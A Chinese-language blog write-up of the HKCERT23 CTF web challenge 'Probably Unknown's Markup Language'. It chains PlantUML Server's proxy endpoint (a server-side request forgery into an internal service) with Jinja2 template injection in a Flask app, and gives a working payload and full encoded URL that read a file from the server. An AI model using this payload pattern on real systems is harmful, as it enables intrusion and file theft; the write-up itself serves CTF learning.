---
title: "HKCERT23: Probably Unknown's Markup Language"
author: Li Yan
pubDatetime: 2023-11-18T08:51:00Z
postSlug: hkcert23-puml
featured: false
draft: false
tags:
- Cybersec
- CTF
description: 眾所周知，CS 專業的學生必須掌握 HTML、XML 等一長串標記語言... 那 IS 專業呢？UML？UML 到底算不算標記語言？

---

這是我第一次參加 HKCERT CTF，感覺題目的難度比 PWC Hackaday 還要高。

坦白說，作為一個 CTF 新手，這對我來說真的是一大挑戰。但幸運的是，在連續爆肝兩天並堅持不懈地 Google 之後，我終於解出了一些題目。（我覺得我的肝現在強得可怕。）

## 題目內容

我們都知道 CS (Computer Science) 專業的學生必須掌握 HTML、XML 等一長串標記語言...
那 IS (Information Systems) 專業呢？UML？UML 到底算不算標記語言？

## 解題思路

首先，快速檢視一下 `/docker-compose.yml` 文件。

```yaml
services:
  plantuml:
    build: plantuml-server
    ports:
      - 8001:8080
    restart: unless-stopped
  puml.local:
    build: web
    restart: unless-stopped

```

這顯示包含 Flag 的 web service (`puml.local`) 無法由使用者直接從外部存取，但可以透過 plantuml server 在內網以 `puml.local:80` 訪問到。

參考 [PlantUML 官方文件](https://plantuml.com/server)，PlantUML Server 提供了一個 Proxy 服務的 API Endpoint。
在這個服務中，PlantUML 會訪問使用者提供的 URL，解析回應內容中的 PlantUML 代碼（例如 `@startuml\n ... \n@enduml`），並根據這些代碼生成圖表。

接著查看 `/web/server.py` 的原始碼。

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)
@app.route("/")
def index():
	return render_template_string("""{%% raw %%}

...

<body>
<div>
    <h1>PUML Demo</h1>
    <p><textarea>%(puml)s</textarea></p>
    <p><a href="https://plantuml.com/">More information...</a></p>

...

{%% endraw %%}""" % {"puml":request.args.get("puml")})

if __name__ == "__main__":
	app.run(host="0.0.0.0", port=80)

```

Server 接收 `puml` 參數後，直接將其格式化進頁面模板 (Template) 中，這意味著我們可以利用 **SSTI (Server-Side Template Injection)** 進行攻擊。

雖然程式碼使用了 `{% raw %}` 標籤試圖防止 SSTI 攻擊，但我們可以直接閉合它來繞過。

現在，我們構造 `puml` 參數如下：

```python
{% endraw %}
@startuml
a:{{''.__class__.__mro__[1].__subclasses__()[100].__init__.__globals__.__builtins__['open']('/proof.sh').read()}}
@enduml
{% raw %}

```

這段 Payload 的邏輯是：

1. 先用 `{% endraw %}` 閉合原有的 raw 標籤。
2. 插入 `@startuml` 讓 PlantUML 識別。
3. 利用 Python 的 SSTI 漏洞讀取 `/proof.sh` (Flag 所在)，並將內容顯示在 PlantUML 的節點 `a` 中。
4. 最後用 `{% raw %}` 閉合後面的標籤以維持語法結構。

將所有內容組合成最終的 Payload URL：

```
http://chal.hkcert23.pwnable.hk:28104/proxy?fmt=svg&src=http://puml.local/?puml=%250A%7B%2525%2520endraw%2520%2525%7D%250A@startuml%250Aa:%7B%7B%2527%2527.__class__.__mro__%5B1%5D.__subclasses__()[100].__init__.__globals__.__builtins__[%27open%27](%27/proof.sh%27).read()%7D%7D%250A@enduml%250A%7B%2525%2520raw%2520%2525%7D%250A

```

訪問這個 URL，PlantUML Server 會去請求內網的 Web Server，觸發 SSTI 執行命令，並將讀取到的 Flag 渲染在生成的圖片中。